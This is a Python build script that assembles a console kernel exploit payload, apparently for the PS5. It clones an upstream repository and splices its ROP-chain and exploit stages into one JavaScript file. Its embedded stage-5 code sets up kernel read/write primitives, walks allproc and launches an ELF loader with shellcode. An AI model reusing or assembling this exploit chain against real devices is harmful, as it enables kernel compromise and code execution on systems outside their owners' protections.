#!/usr/bin/env python3
"""Generate payloads/poops.js from slopkit repository and poops_port templates.
Splices validate upstream anchors; fidelity checks are in tools/selftest.js.

    python3 tools/build_poops_payload.py [--repo <path>] [--clone]
"""

import argparse
import os
import re
import subprocess
import sys
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
HERE = Path(__file__).resolve().parent / "poops_port"
OUT = ROOT / "payloads/poops.js"

SLOPKIT_REPO_URL = "https://github.com/jordyidk/slopkit.git"


def check_slopkit_dir(dir_path):
    if not dir_path or not dir_path.is_dir():
        return None
    if (dir_path / "rop.js").exists() and (dir_path / "poops.js").exists():
        return dir_path
    sub = dir_path / "slopkit"
    if sub.is_dir() and (sub / "rop.js").exists() and (sub / "poops.js").exists():
        return sub
    return None


def find_slopkit(requested_path=None):
    if requested_path:
        p = Path(requested_path).resolve()
        found = check_slopkit_dir(p)
        if found:
            return found
        raise Fail(f"specified slopkit path '{requested_path}' does not contain rop.js and poops.js")

    env_dir = os.environ.get("SLOPKIT_DIR")
    if env_dir:
        found = check_slopkit_dir(Path(env_dir).resolve())
        if found:
            return found

    candidates = [
        ROOT / "slopkit",
        ROOT / "build/slopkit",
        ROOT / "third_party/slopkit",
        ROOT / ".for_reference/slopkit",
        ROOT.parent / "slopkit",
    ]
    for c in candidates:
        found = check_slopkit_dir(c)
        if found:
            return found
    return None


def clone_slopkit(target_dir):
    print(f"[*] Upstream slopkit not found locally.")
    print(f"[*] Cloning {SLOPKIT_REPO_URL} into {target_dir}...")
    target_dir.parent.mkdir(parents=True, exist_ok=True)
    res = subprocess.run(
        ["git", "clone", "--depth", "1", SLOPKIT_REPO_URL, str(target_dir)],
        capture_output=True,
        text=True,
    )
    if res.returncode != 0:
        raise Fail(f"git clone failed:\n{res.stderr.strip()}")
    found = check_slopkit_dir(target_dir)
    if not found:
        raise Fail(f"cloned repository at {target_dir} is missing rop.js and poops.js")
    return found


MARK = "// ======================= PORT BOUNDARY: %s %s ==================%s\n"


def boundary(label, note):
    """Keep provenance on the marker line, outside the upstream comparison region."""
    return MARK % (label, "starts here", ("  " + note) if note else "")


def boundary_end(label):
    return MARK % (label, "ends here", "")


class Fail(Exception):
    pass


def read(path):
    if not path.exists():
        raise Fail(f"missing {path}")
    return path.read_text(encoding="utf-8")


def splice(text, start_marker, end_marker, replacement, what):
    """Replace everything from start_marker up to and including end_marker."""
    i = text.find(start_marker)
    if i < 0:
        raise Fail(f"{what}: start marker not found: {start_marker!r}")
    j = text.find(end_marker, i)
    if j < 0:
        raise Fail(f"{what}: end marker not found: {end_marker!r}")
    j += len(end_marker)
    return text[:i] + replacement + text[j:]


def splice_exclusive(text, begin, end, replacement, what):
    """Replace [begin, end) with a block delimited by poops port markers."""
    lines = replacement.rstrip("\n").split("\n")
    tag = None
    if lines and lines[0].startswith("  // >>> poops port "):
        tag = lines[0][len("  // >>> poops port "):].split(":")[0].strip()
    if not tag:
        raise Fail(f"{what}: replacement does not start with a poops port marker")
    if lines[-1] != f"  // >>> poops port {tag} end":
        raise Fail(
            f"{what}: replacement must end with '  // >>> poops port {tag} end', "
            f"got {lines[-1]!r}")
    for line in lines:
        if line.startswith("  // >>> poops port ") and text.count(line) != 0:
            raise Fail(f"{what}: marker {line!r} already exists in the region")

    i = text.find(begin)
    if i < 0:
        raise Fail(f"{what}: begin anchor not found: {begin!r}")
    j = text.find(end, i)
    if j < 0:
        raise Fail(f"{what}: end anchor not found: {end!r}")
    return text[:i] + replacement + text[j:]


def expect(text, needle, what):
    if needle not in text:
        raise Fail(f"{what}: expected to find {needle!r} in the upstream region")
    return text


def build_rop_region(ref):
    src = read(ref / "rop.js")
    lines = src.split("\n")

    start = next((n for n, l in enumerate(lines) if l.startswith("class rop")), None)
    if start is None:
        raise Fail("rop.js: `class rop` not found")
    end = next((n for n, l in enumerate(lines) if l.startswith("class worker_rop")), None)
    if end is None:
        raise Fail("rop.js: `class worker_rop` not found")

    base = "\n".join(lines[start:end]).rstrip() + "\n"
    tr = next((n for n, l in enumerate(lines) if l.startswith("class thread_rop")), None)
    if tr is None:
        raise Fail("rop.js: `class thread_rop` not found")
    thread = "\n".join(lines[tr:]).rstrip() + "\n"

    region = base + "\n" + thread
    expect(region, "class thread_rop extends rop", "rop.js region")
    expect(region, "self_healing_syscall", "rop.js region")
    expect(region, "create_branch", "rop.js region")
    expect(region, "set_branch_points", "rop.js region")
    expect(region, "increment_dword", "rop.js region")

    alerts = region.count("alert(")
    if alerts != 4:
        raise Fail(f"rop.js: expected exactly 4 alert() call sites, found {alerts}")
    region = region.replace(
        'alert("you\'re trying to write a value exceeding 32-bits without using a int64 instance");',
        'throw new Error("rop: value exceeds 32 bits and was not an int64 instance");',
    )
    region = region.replace(
        'alert("You\'re trying to write a non number/non int64 value?");',
        'throw new Error("rop: pushed a value that is neither a number nor an int64");',
    )
    region = region.replace(
        'alert("Unsupported target register: " + target_reg);',
        'throw new Error("rop: unsupported target register: " + target_reg);',
    )
    region = region.replace(
        'alert("illegal branch type.");',
        'throw new Error("rop: illegal branch type " + type);',
    )
    if "alert(" in region:
        raise Fail("rop.js: an alert() call site did not match and was left in place")

    return region


# --------------------------------------------------------------- poops.js ----
def build_poops_region(ref):
    src = read(ref / "poops.js")

    # E1 -- drop `export `. The payload is run by indirect eval and has no module
    # scope, so `export` is a syntax error rather than a no-op.
    region, n_exports = re.subn(r"^export (const|function) ", r"\1 ", src, flags=re.M)
    if n_exports != 25:
        raise Fail(f"poops.js: expected 25 `export` declarations, found {n_exports}")
    if re.search(r"^export ", region, flags=re.M):
        raise Fail("poops.js: an `export` survived the rewrite")

    # E2 -- delete fetchInto(). Its only caller was stage5Body, which E3 replaces,
    # and it is the payload's only other reference to the network.
    region = splice_exclusive(
        region,
        "  async function fetchInto(url, sink) {",
        "  function unpin(buf, why) {",
        E2_TOMBSTONE,
        "poops.js fetchInto",
    )

    # E3 -- replace stage5Body() with the api.launchKexp() delegation.
    region = splice_exclusive(
        region,
        "  async function stage5Body(opts) {",
        "  return {\n    PK,",
        STAGE5_REPLACEMENT,
        "poops.js stage5Body",
    )
    expect(region, "async function stage5Body(opts) {", "poops.js stage5 replacement")
    expect(region, "await launchKexp(", "poops.js stage5 replacement")
    expect(region, "\n  return {\n    PK,", "poops.js engine return block")
    outside = region.replace(STAGE5_REPLACEMENT, "", 1).replace(E2_TOMBSTONE, "", 1)
    for gone in (
        "KEXP_BIN_NAME",
        "elfldr-ps5-1360",
        "apiTable",
        "sys(PSYS.JITSHM_CREATE",
        "sys(PSYS.JITSHM_ALIAS",
        "POOPS_SPAWN",
    ):
        if gone in outside:
            raise Fail(f"poops.js: {gone!r} survived in the replaced stage5Body")

    # The only remaining fetchInto reference was stage5Body's, which E3 has now
    # replaced -- checked here rather than after E2, which alone leaves one behind.
    if "fetchInto" in outside:
        raise Fail("poops.js: a fetchInto reference survived")

    # E4 -- read launchKexp from the context, so the payload owns the wiring and
    # the exploit owns the sequencing, with no import on either side.
    before = region
    region = region.replace(
        "    latch,\n  } = X;\n",
        "    latch,\n    launchKexp,\n  } = X;\n",
        1,
    )
    if region == before:
        raise Fail("poops.js: makePoopsEngine's destructuring was not found")
    expect(region, "    launchKexp,\n  } = X;", "poops.js destructuring")

    # E5 -- ps10_stage5's dry-run summary.
    upstream_dry = (
        '      if (!r.ran) return PASS("dry run: blobs staged, allproc found, shellcode " +\n'
        '        "mapped RWX, pthread entries located, argument block " + "built",);'
    )
    ported_dry = (
        '      // >>> poops port E5: dry-run summary\n'
        '      //\n'
        '      // Upstream staged its own binaries, so a dry run really had located the\n'
        '      // pthread entries and built the argument block. runKexp() builds those in\n'
        '      // its stage 3, right before pthread_create, and has no seam to stop\n'
        '      // between -- so upstream\'s sentence would claim two things it never did.\n'
        '      if (!r.ran) return PASS("dry run: elfldr and the shellcode mapped, " +\n'
        '        "allproc validated, pipe bootstrap verified, then stopped before " +\n'
        '        "pthread_create",);\n'
        '      // >>> poops port E5 end'
    )
    if upstream_dry not in region:
        raise Fail("poops.js: ps10_stage5's dry-run summary was not found")
    region = region.replace(upstream_dry, ported_dry, 1)
    expect(region, "  // >>> poops port E5 end", "poops.js E5 markers")

    for bad in ("fetch(", "XMLHttpRequest", "new Worker", "import(", "require("):
        if bad in outside:
            raise Fail(f"poops.js region contains {bad!r}; the port must not fetch")

    return region


E2_TOMBSTONE = (
    "  // >>> poops port E2: fetchInto removed\n"
    "  //\n"
    "  // A streaming HTTP fetch helper lived here. Its only caller was stage 5,\n"
    "  // and stage 5 is replaced by E3, so nothing in this payload fetches any\n"
    "  // more -- see the region header for why a fetch could not have worked.\n"
    "\n"
    "  // >>> poops port E2 end\n\n"
)


STAGE5_REPLACEMENT = '''  // >>> poops port E3: stage5Body replaced with api.launchKexp()
  async function stage5Body(opts) {
    const o = opts || {};
    const out = { ok: false, why: "", steps: [], ran: false, shellRet: null };

    flushMark(
      "STAGE5-ENTER", "dryRun=" + !!o.dryRun + "-jailbroken=" + S.jailbroken,
    );
    if (!S.jailbroken) {
      out.why = "stage 4 jailbreak not proved by getuid()";
      return out;
    }
    if (typeof launchKexp !== "function") {
      out.why = "launchKexp is not in the context: this payload must be run by " +
        "payloads/poops.js, not by importing poops.js directly";
      return out;
    }

    // Validate proc_filedesc and allproc before delegating to the loader.
    if (!S.procFiledesc) {
      out.why = "stage 2 never resolved proc_filedesc";
      return out;
    }
    const ap = await getAllproc();
    flushMark("ALLPROC-STAGE5", "ok=" + ap.ok + "-addr=" + hx(ap.addr || i64(0, 0)) +
      (ap.ok ? "" : "-why=" + String(ap.why).slice(0, 120)));
    if (!ap.ok) {
      out.why = "allproc " + ap.why;
      return out;
    }
    out.steps.push("allproc " + hx(ap.addr));

    const krw = {
      // Pass allproc explicitly; this primitive does not resolve a kernel text base.
      ktextBase: null,
      procFdAddr: S.procFiledesc.add32(PK.OFF.FILEDESC_OFILES),
      read8: async (address) => (await kread64Fast(address)).v,
      write4: async (address, value) => kwrite32Fast(address, value >>> 0),
      write8: async (address, value) => kwrite64Fast(address, value),
    };

    let res;
    try {
      res = await launchKexp({
        krw,
        allproc: ap.addr,
        // A dry run stops after pipe setup, before shellcode execution.
        stopAfter: o.dryRun ? "pipes" : "spawn",
      });
    } catch (e) {
      out.why = "launchKexp threw: " + ((e && e.message) || e);
      flushMark("STAGE5-FAILED", String(out.why).slice(0, 160));
      return out;
    }

    if (!res || res.stage === "pipes") {
      out.ok = true;
      out.ran = false;
      out.steps.push("elfldr and the shellcode mapped, pipe bootstrap verified, " +
        "then stopped before pthread_create");
      flushMark("STAGE5-DONE", "stage=" + (res ? res.stage : "pipes") + "-nothing-executed");
      return out;
    }

    out.ok = true;
    out.ran = true;
    out.shellRet = res.result === undefined ? 0 : res.result;
    out.steps.push("shellcode returned " + hx(i64(out.shellRet >>> 0, 0)));
    flushMark(
      "STAGE5-DONE",
      "stage=" + (res.stage || "spawn") + "-shellRet=" + out.shellRet,
    );
    return out;
  }

  // >>> poops port E3 end

'''


def main(argv=None):
    parser = argparse.ArgumentParser(description="Generate payloads/poops.js from slopkit repository.")
    parser.add_argument("repo", nargs="?", help="Path to slopkit repository or sources")
    parser.add_argument("--repo", dest="repo_flag", help="Path to slopkit repository or sources")
    parser.add_argument("--clone", action="store_true", help="Force clone slopkit into build/slopkit")
    args = parser.parse_args(argv)

    repo_arg = args.repo_flag or args.repo
    ref = None
    try:
        if args.clone:
            ref = clone_slopkit(ROOT / "build/slopkit")
        else:
            ref = find_slopkit(repo_arg)
            if not ref:
                if not repo_arg:
                    ref = clone_slopkit(ROOT / "build/slopkit")
                else:
                    raise Fail(f"slopkit repository not found at '{repo_arg}'")
    except Fail as e:
        print(f"error: {e}", file=sys.stderr)
        print(f"hint: clone {SLOPKIT_REPO_URL} or run: python3 tools/build_poops_payload.py /path/to/slopkit", file=sys.stderr)
        return 1

    try:
        header = read(HERE / "header.js.txt").rstrip() + "\n"
        rop = build_rop_region(ref)
        poops = build_poops_region(ref)
        adapter = read(HERE / "adapter.js.txt").rstrip() + "\n"
    except Fail as e:
        print(f"error: {e}", file=sys.stderr)
        return 1

    parts = [
        header,
        "\n" + boundary("slopkit rop.js",
                        "slopkit/rop.js: rop and thread_rop; alert diagnostics replaced by throws."),
        rop,
        boundary_end("slopkit rop.js"),
        boundary("upstream poops.js",
                 "slopkit/poops.js with port edits E1-E5."),
        poops,
        boundary_end("upstream poops.js"),
        "\n// ======================= PORT BOUNDARY: port adapter starts here ======\n"
        + adapter +
        "// ======================= PORT BOUNDARY: port adapter ends here ========\n",
    ]
    text = "".join(parts)

    for name, body in (("poops.js", poops), ("rop.js", rop)):
        if body.count("{") - body.count("}") != 0:
            raise Fail(
                f"{name}: region is not brace-balanced "
                f"({body.count('{')} open, {body.count('}')} close); an anchor "
                f"swallowed a line it should have left alone")
        if not body.endswith("\n"):
            raise Fail(f"{name}: region does not end with a newline")

    if not re.search(r"^\s*return async function \(api\) \{", adapter, flags=re.M):
        raise Fail("adapter does not return an entry function")

    OUT.write_text(text, encoding="utf-8")
    lines = text.count("\n")
    print(f"wrote {OUT.relative_to(ROOT)}: {len(text)} bytes, {lines} lines")
    if len(text) > 512 * 1024:
        print("error: over the loader's 512 KiB payload limit", file=sys.stderr)
        return 1
    return 0


if __name__ == "__main__":
    sys.exit(main())